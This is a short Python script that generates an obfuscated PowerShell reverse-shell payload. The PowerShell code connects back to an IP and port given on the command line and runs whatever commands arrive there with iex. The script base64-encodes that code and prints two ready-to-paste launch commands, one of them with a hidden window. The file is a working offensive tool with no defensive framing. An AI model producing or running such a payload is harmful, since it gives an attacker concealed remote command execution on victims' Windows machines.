#! /usr/bin/python3

import sys
from base64 import b64encode

def b64encode_shell(ip, port):
    text = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
    return b64encode(text.encode("utf-16")[2:]).decode()

shell = b64encode_shell(sys.argv[1], sys.argv[2])
print("Hidden\n")
print(f"powershell -nop -w hidden -enc {shell}")
print("\nVisible\n")
print(f"powershell -nop -enc {shell}")
